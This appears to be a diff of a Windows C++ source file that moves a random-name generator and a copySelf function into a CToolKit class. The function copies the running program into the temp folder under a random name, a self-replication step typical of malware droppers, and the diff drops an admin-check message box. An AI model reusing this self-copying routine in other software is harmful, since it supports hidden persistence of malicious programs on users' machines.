@@ -1,14 +1,13 @@
 #include "stdafx.h"
+#include "ToolKit.h"
 #include "libsysaux.h"
-#include "copyself.h"
 
 #define DIST_DIR "./"
 
 //保存随机命名程序的路径
-TCHAR executePath[MAX_PATH];
 
 //生成随机字母
-int SEU_RandEx(int min, int max)
+int CToolKit::SEU_RandEx(int min, int max)
 {
 	if (min == max)
 		return min;
@@ -19,14 +18,13 @@ int SEU_RandEx(int min, int max)
 	return seed % (max - min + 1) + min;
 }
 
-BOOL copySelf()
+BOOL CToolKit::copySelf()
 {
 	TCHAR currentFullPath[MAX_PATH];
 	TCHAR moduleName[MAX_PATH];
 	TCHAR tempPath[MAX_PATH];
 
-	if (CSysInfo::IsRunAsAdmin())
-		MessageBox(NULL, L"admin", L"info", MB_OK);
+/////////////
 
 	GetTempPath(MAX_PATH, tempPath);
 	//GetSystemDirectory(tempPath, MAX_PATH);
@@ -47,7 +45,7 @@ BOOL copySelf()
 	 
 	 if (!CopyFile(moduleName, currentFullPath, FALSE))
 	 {
-		 printf("Copy file failed! \n");
+		 printf("[-] Copy file failed! \n");
 		 return FALSE;
 	 }
 	return TRUE;
